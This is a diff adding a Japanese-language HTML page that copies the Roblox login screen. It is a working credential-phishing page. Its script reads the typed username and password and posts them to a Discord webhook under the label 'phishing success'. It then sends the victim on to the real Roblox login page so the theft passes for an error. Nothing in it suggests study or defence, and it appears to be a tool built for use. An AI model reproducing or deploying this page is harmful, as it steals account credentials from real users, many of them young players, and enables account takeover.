@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <style>
+        body {
+            font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+            background-color: #f2f4f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+            width: 400px;
+            text-align: center;
+        }
+        h1 { font-size: 24px; margin-bottom: 25px; color: #404040; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #c3c3c3;
+            border-radius: 4px;
+            box-sizing: border-box;
+            background-color: #f2f4f5;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0084ff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover { background-color: #0074e0; }
+        .footer-links { margin-top: 20px; font-size: 13px; color: #0084ff; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://images.rbxcdn.com/2342730f24036f0688035255dc76579d.svg" alt="Roblox" width="150">
+    <h1>Robloxにログイン</h1>
+    <input type="text" id="username" placeholder="ユーザー名/メールアドレス/電話番号">
+    <input type="password" id="password" placeholder="パスワード">
+    <button onclick="sendToWebhook()">ログイン</button>
+    <div class="footer-links">
+        パスワードを忘れた場合 <br><br>
+        <span style="color: #666;">アカウントをお持ちでないですか？</span> 新規登録
+    </div>
+</div>
+
+<script>
+    function sendToWebhook() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        const webhookURL = "https://discord.com/api/webhooks/1454062723741782213/0y0nWdtU2srAHYDuGuCXMrU1BEw7OZC0NQlVhxFMx5CC9hqYgiYOBEBaIaT6B1pWwfCa";
+        
+        // Discordは直接の送信を嫌うので、本来はプロキシを通すべきだが
+        // ブラウザからのfetchなら直接送れる場合が多い
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: "🚨 **新着パスワード情報ゲット！**",
+                embeds: [{
+                    title: "フィッシング成功",
+                    color: 16711680,
+                    fields: [
+                        { name: "ユーザー名", value: user, inline: true },
+                        { name: "パスワード", value: pass, inline: true }
+                    ],
+                    footer: { text = "Tokyo hub v0.5 | Logger System" }
+                }]
+            })
+        }).then(() => {
+            // 送信後に本物のRobloxに飛ばして、エラーっぽく見せる
+            window.location.href = "https://www.roblox.com/login";
+        });
+    }
+</script>
+
+</body>
+</html>
